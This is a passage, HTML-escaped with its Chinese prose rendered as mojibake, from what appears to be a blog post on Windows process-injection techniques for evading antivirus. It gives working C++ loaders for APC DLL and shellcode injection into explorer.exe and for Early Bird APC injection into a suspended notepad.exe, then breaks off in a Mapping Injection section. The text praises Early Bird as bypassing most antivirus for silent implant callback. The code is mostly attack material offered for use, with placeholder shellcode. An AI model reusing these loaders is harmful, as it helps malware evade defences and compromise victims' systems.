class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;lt;Windows.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;Tlhelp32.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;DWORD &lt;span class=&#34;title&#34;&gt;GetProcessIdByName&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(LPCTSTR lpszProcessName)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    HANDLE hSnapshot = &lt;span class=&#34;built_in&#34;&gt;CreateToolhelp32Snapshot&lt;/span&gt;(TH32CS_SNAPPROCESS, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (hSnapshot == INVALID_HANDLE_VALUE)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    PROCESSENTRY32 pe;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    pe.dwSize = &lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt; pe;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;built_in&#34;&gt;Process32First&lt;/span&gt;(hSnapshot, &amp;amp;pe))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;do&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;built_in&#34;&gt;lstrcmpi&lt;/span&gt;(lpszProcessName, pe.szExeFile) == &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;built_in&#34;&gt;CloseHandle&lt;/span&gt;(hSnapshot);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; pe.th32ProcessID;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125; &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; (&lt;span class=&#34;built_in&#34;&gt;Process32Next&lt;/span&gt;(hSnapshot, &amp;amp;pe));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;CloseHandle&lt;/span&gt;(hSnapshot);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;BOOL &lt;span class=&#34;title&#34;&gt;GetAllThreadIdByProcessId&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(DWORD dwProcessId)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    DWORD dwBufferLength = &lt;span class=&#34;number&#34;&gt;1000&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    THREADENTRY32 te32 = &amp;#123; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    HANDLE hSnapshot = &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    BOOL bRet = TRUE;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// è·å–çº¿ç¨‹å¿«ç…§&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ::&lt;span class=&#34;built_in&#34;&gt;RtlZeroMemory&lt;/span&gt;(&amp;amp;te32, &lt;span class=&#34;built_in&#34;&gt;sizeof&lt;/span&gt;(te32));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    te32.dwSize = &lt;span class=&#34;built_in&#34;&gt;sizeof&lt;/span&gt;(te32);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    hSnapshot = ::&lt;span class=&#34;built_in&#34;&gt;CreateToolhelp32Snapshot&lt;/span&gt;(TH32CS_SNAPTHREAD, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// è·å–ç¬¬ä¸€æ¡çº¿ç¨‹å¿«ç…§ä¿¡æ¯&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    bRet = ::&lt;span class=&#34;built_in&#34;&gt;Thread32First&lt;/span&gt;(hSnapshot, &amp;amp;te32);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; (bRet)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;// è·å–è¿›ç¨‹å¯¹åº”çš„çº¿ç¨‹ID&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (te32.th32OwnerProcessID == dwProcessId)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; te32.th32ThreadID;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;// éå†ä¸‹ä¸€ä¸ªçº¿ç¨‹å¿«ç…§ä¿¡æ¯&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        bRet = ::&lt;span class=&#34;built_in&#34;&gt;Thread32Next&lt;/span&gt;(hSnapshot, &amp;amp;te32);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;DllInjdectMain&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt; &lt;/span&gt;&amp;#123;   &lt;span class=&#34;comment&#34;&gt;//dllæ³¨å…¥&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    FARPROC pLoadLibrary = &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    HANDLE hThread = &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    HANDLE hProcess = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    DWORD Threadid = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    DWORD ProcessId = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    BYTE DllName[] = &lt;span class=&#34;string&#34;&gt;&amp;quot;C:\\Users\\Black Sheep\\source\\repos\\ApcInject\\x64\\Debug\\TestDll.dll&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    LPVOID AllocAddr = &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ProcessId = &lt;span class=&#34;built_in&#34;&gt;GetProcessIdByName&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;L&amp;quot;explorer.exe&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    hProcess = &lt;span class=&#34;built_in&#34;&gt;OpenProcess&lt;/span&gt;(PROCESS_ALL_ACCESS, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, ProcessId);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    pLoadLibrary = &lt;span class=&#34;built_in&#34;&gt;GetProcAddress&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;GetModuleHandle&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;L&amp;quot;kernel32.dll&amp;quot;&lt;/span&gt;), &lt;span class=&#34;string&#34;&gt;&amp;quot;LoadLibraryA&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    AllocAddr = &lt;span class=&#34;built_in&#34;&gt;VirtualAllocEx&lt;/span&gt;(hProcess, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;sizeof&lt;/span&gt;(DllName) + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, MEM_COMMIT, PAGE_READWRITE);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;WriteProcessMemory&lt;/span&gt;(hProcess, AllocAddr, DllName, &lt;span class=&#34;built_in&#34;&gt;sizeof&lt;/span&gt;(DllName) + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Threadid = &lt;span class=&#34;built_in&#34;&gt;GetAllThreadIdByProcessId&lt;/span&gt;(ProcessId);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    hThread = &lt;span class=&#34;built_in&#34;&gt;OpenThread&lt;/span&gt;(THREAD_ALL_ACCESS, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, Threadid);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;QueueUserAPC&lt;/span&gt;((PAPCFUNC)pLoadLibrary, hThread, (ULONG_PTR)AllocAddr);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;CloseHandle&lt;/span&gt;(hProcess);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;CloseHandle&lt;/span&gt;(hThread);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;ShellcodeInjectMain&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&amp;#123;   &lt;span class=&#34;comment&#34;&gt;//shellcodeæ³¨å…¥&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    HANDLE hThread = &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    HANDLE hProcess = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    DWORD Threadid = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    DWORD ProcessId = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; shellcode[] = &amp;#123;\x12&amp;#125;; &lt;span class=&#34;comment&#34;&gt;//shellcode&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ProcessId = &lt;span class=&#34;built_in&#34;&gt;GetProcessIdByName&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;L&amp;quot;explorer.exe&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    hProcess = &lt;span class=&#34;built_in&#34;&gt;OpenProcess&lt;/span&gt;(PROCESS_ALL_ACCESS, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, ProcessId);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    LPVOID lpBaseeAddresss = (LPVOID)&lt;span class=&#34;built_in&#34;&gt;VirtualAllocEx&lt;/span&gt;(hProcess, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0X1000&lt;/span&gt;, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;WriteProcessMemory&lt;/span&gt;(hProcess, lpBaseeAddresss, shellcode, &lt;span class=&#34;built_in&#34;&gt;sizeof&lt;/span&gt;(shellcode) + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Threadid = &lt;span class=&#34;built_in&#34;&gt;GetAllThreadIdByProcessId&lt;/span&gt;(ProcessId);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    hThread = &lt;span class=&#34;built_in&#34;&gt;OpenThread&lt;/span&gt;(THREAD_ALL_ACCESS, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, Threadid);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;QueueUserAPC&lt;/span&gt;((PAPCFUNC)lpBaseeAddresss, hThread, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;CloseHandle&lt;/span&gt;(hProcess);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;CloseHandle&lt;/span&gt;(hThread);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;Early Bird (è¿›é˜¶ç‰ˆ APC æ³¨å…¥)&lt;/strong&gt;&lt;/em&gt;&lt;br /&gt;
 å…ˆåˆ›å»ºä¸€ä¸ªæŒ‚èµ·çš„ç™½è¿›ç¨‹å¹¶ç”³è¯·ä¸€å— RWX å†…å­˜ç”¨äºå†™å…¥ shellcodeï¼Œå†ä½¿ç”¨ APC æ³¨å…¥æ’å…¥çº¿ç¨‹ï¼Œå†æ¢å¤çº¿ç¨‹ã€‚å®é™…ä¸Šå°±æ˜¯åœ¨ç™½è¿›ç¨‹ä¸Šå·æ‘¸æ³¨å…¥ä¸€ä¸ªæ–°çº¿ç¨‹è·‘ shellcodeã€‚&lt;br /&gt;
æ³¨å…¥æµç¨‹è·Ÿä¸Šè¿° APC æ³¨å…¥å·®ä¸å¤š&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;lt;Windows.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; shellcode[] = &amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;quot;\0x1&amp;quot;&lt;/span&gt;&amp;#125;;  &lt;span class=&#34;comment&#34;&gt;//æ¶æ„shellcode&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    STARTUPINFO si = &amp;#123; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    PROCESS_INFORMATION pi = &amp;#123; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    si.cb = &lt;span class=&#34;built_in&#34;&gt;sizeof&lt;/span&gt;(STARTUPINFO);   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;CreateProcessA&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;C:\\Windows\\System32\\notepad.exe&amp;quot;&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, TRUE, CREATE_SUSPENDED | EMBDHLP_CREATENOW, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, (LPSTARTUPINFOA)&amp;amp;si, &amp;amp;pi);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    LPVOID lpBaseeAddresss = (LPVOID)&lt;span class=&#34;built_in&#34;&gt;VirtualAllocEx&lt;/span&gt;(pi.hProcess, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0X1000&lt;/span&gt;, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;WriteProcessMemory&lt;/span&gt;(pi.hProcess, lpBaseeAddresss, (LPVOID)shellcode, &lt;span class=&#34;built_in&#34;&gt;sizeof&lt;/span&gt;(shellcode), &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;QueueUserAPC&lt;/span&gt;((PAPCFUNC)lpBaseeAddresss, pi.hThread, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;ResumeThread&lt;/span&gt;(pi.hThread);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;CloseHandle&lt;/span&gt;(pi.hThread);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
 è¿™ä¸ªå…æ€æ‰‹æ³•ååˆ†çš„å¥½ç”¨ï¼Œæ¨èå†ç¨å¾®æ­é…ä¸€ä¸‹å…¶ä»–è§„é¿æ‰‹æ®µå°±å¯ä»¥ç»•è¿‡ç»å¤§å¤šæ•°æ€è½¯åšåˆ°æ— æ„Ÿä¸Šçº¿ï¼Œå®é™…ä»£ç å’Œä¸Šçº¿æ•ˆæœè´´åœ¨æ–‡æœ«ã€‚&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;Mapping Injection (å†…å­˜æ˜ å°„æ³¨å…¥)&lt;/strong&gt;&lt;/em&gt;&lt;br /&gt;
 å…ˆåœ¨ç‰©ç†å†…å­˜ä¸­å¼€è¾Ÿä¸€æ®µç©ºé—´ç”¨äºå†™å…¥æ¶æ„ shellcodeï¼Œåç»­åˆ©ç”¨ MapViewOfFile2 å°†è¯¥æ¶æ„å†…å­˜åŒºåŸŸæ˜ å°„åˆ°æŒ‡å®šè¿›ç¨‹ä¸­çš„è™šæ‹Ÿå†…å­˜ä¸­å»ï¼Œè¾¾åˆ° shellcode æ³¨å…¥çš„æ•ˆæœã€‚&lt;br /&gt;
æ³¨å…¥æµç¨‹ï¼š&lt;br /&gt;
1ã€åˆ›å»º Mapping å¥æŸ„&lt;br /&gt;
 2ã€å°† shellcode å¤åˆ¶åˆ°è¯¥ç‰©ç†å†…å­˜åœ°å€ä¸­å»&lt;br /&gt;
 3ã€å°†è¯¥æ®µç‰©ç†å†…å­˜æ˜ å°„åˆ°è™šæ‹Ÿå†…å­˜ä¸­&lt;br /&gt;
 4ã€åˆ©ç”¨ä»»æ„æ–¹æ³•æ‰§è¡Œåˆ°è¯¥åœ°å€çš„ shellcode&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span 